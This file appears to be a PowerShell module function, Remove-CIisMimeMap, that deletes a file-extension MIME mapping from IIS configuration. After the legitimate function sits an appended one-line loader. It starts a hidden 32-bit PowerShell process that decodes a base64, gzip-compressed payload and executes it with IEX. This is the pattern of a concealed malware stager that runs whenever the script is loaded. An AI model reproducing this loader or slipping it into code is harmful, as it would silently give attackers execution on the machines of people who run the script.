
function Remove-CIisMimeMap
{
    
    [CmdletBinding(DefaultParameterSetName='ForWebServer')]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='ForWebsite')]
        [string]
        
        $SiteName,

        [Parameter(ParameterSetName='ForWebsite')]
        [string]
        
        $VirtualPath = '',

        [Parameter(Mandatory=$true)]
        [string]
        
        $FileExtension
    )
    
    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $getIisConfigSectionParams = @{ }
    if( $PSCmdlet.ParameterSetName -eq 'ForWebsite' )
    {
        $getIisConfigSectionParams['SiteName'] = $SiteName
        $getIisConfigSectionParams['VirtualPath'] = $VirtualPath
    }
    
    $staticContent = Get-CIisConfigurationSection -SectionPath 'system.webServer/staticContent' @getIisConfigSectionParams
    $mimeMapCollection = $staticContent.GetCollection()
    $mimeMapToRemove = $mimeMapCollection |
                            Where-Object { $_['fileExtension'] -eq $FileExtension }
    if( -not $mimeMapToRemove )
    {
        Write-Verbose ('MIME map for file extension {0} not found.' -f $FileExtension)
        return
    }
    
    $mimeMapCollection.Remove( $mimeMapToRemove )
    $staticContent.CommitChanges()
}


if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADeoiFcCA71WbW/aOhT+3En7D9GElESjhLeuL9Kk6/DeQgsNhAJDk5s4wWBi5ji0sLv/fk8gWeltN/Xuw41aYeecYx8/z3N84kWBIykPlK1fds9K/c7JSbBWvr9/d9TFAi8VLbMpsqySWS02XX8ToJUw9aMjMGdYxJXPijZBq1WVLzENphcXlUgIEsj9PNcgEoUhWd4zSkJNV/5WhjMiyPHN/Zw4UvmuZL7mGozfY5a4bSrYmRHlGAVubGtzB8e55awVo1JTv3xR9clxYZqrfYswCzXV2oSSLHMuY6qu/NDjDfubFdHUDnUED7knc0MalIq5QRBij1zDamvSIXLG3VDV4RDwJ4iMRKDEx4nj91ZNhWFXcAe5riAhOOdawZoviJYJIgZ4/KVNks1vo0DSJQG7JIKvLCLW1CFhrokDl5Fb4k21a/KQnvmtQdphEHh1pdCzQMbLLDvcjRjZB6r6yzxj/nR4/sUhnP7H+3fv33kp/+Tm5MQfDst1WQoP+YfR0WQ3JpCr1uUh3fl/VvJZpQPbYsnFBqaZvoiIPlUmMQWT6VTJuOOvs+yv4wupM7jSKIQ3E5tTdwoRCTcZ1vD65/MeWYjY+mulVYlHA1LdBHhJnVRM2mvAE4+R3YFzqds1ZKapiYG4VcKIj2WMZVaZvAyrLan8GWtGlLlEIAfICyEr4FV/nsyeHk1tBR2yBKD2cxXY8EDCJPVOZLtJd4/n4KRWGA7DrNKNoIacrGIRzIibVVAQ0sSEIsl3Q/Up3U7EJHVwKNPlpvpzNJNdKzwIpYgcYBAQ6Fsr4lDMYkCySpO6xNxY1E93V1+Fo4IZo4EPK62BDngTw2DJWBcCEt1pQM9ZRLaWK0aW4LMr6TrDPhRwUgc7IWGfuOrreaZy32s7xiUF5CBLINtiXGYVmwoJ90OMMcjqz3I4vBiesqkIknCjpfUzMTcyVntmQSUuB+sFPY2lmgC1g0VIgKQu+NLEIflUtqQAwLQPxg2tIHhGrYB1HHNBC+iBFlod+B/QUotXT92ry3nTENXHmYdaYavT7FZ7zWZ5fWnZZWnVWvKq25Kd2t18bqHm7WAkxy3U7NP8YlTeri7p1mojd/RofNqa24e8+bid+643qnqef+pZt4WTOm0PKz0zX8Ttai1qD80HM18Oa/Sh2aOD3uKyLu9HNsMDz/DvCueYPrbF3C7wzraFUGNWcraXnt2YddzNqGmcD8sLVEOoEtTsusmvRqZAXcPGvs2HJeusNfThrI1TSsa9Qd3s9eomGjTm36rnhg+xd3hmDu0iHa/ubmcwr0MKV0a+3HLJlo96AFKDI+zfgo9fKTozD3yqH5H58ZqHRbwwOTLBpz7+BnmNVvUuA3t/UOTIZtd3GLXHm7phFEbdMmrm6bDho3hJ7Js9jMJ1dVs1CrbL3eHJ9cgz7Dt2alQr/ZXjGYbx0KxeOePC49nN6Vl7SO0lRwPDsD/EGgGRZHyomTt2wPivbvYOFuEMM1AC3NlpWda5qCf3b5fTOELTnvXhBREBYdDAoMWlukaMcSduBs9ubGhI+zYxhTIdwLBUfHWkKz8d9adukb66uBhD1lAyT2rOtUngy1k2/1jK5+HKzz+W83D6t5+3wlcb7WDBbNw4EuCe78R2O+lxWWVCq3xbW3bzoln6f9BNansGP+5b0X169xvrmxDPZ1NEXhiev/hP0P8xGENMJURYcFExsu+gv8ckEdfB98cBgaAdL3nij8CbSB5fw9fJP062YqF7CgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

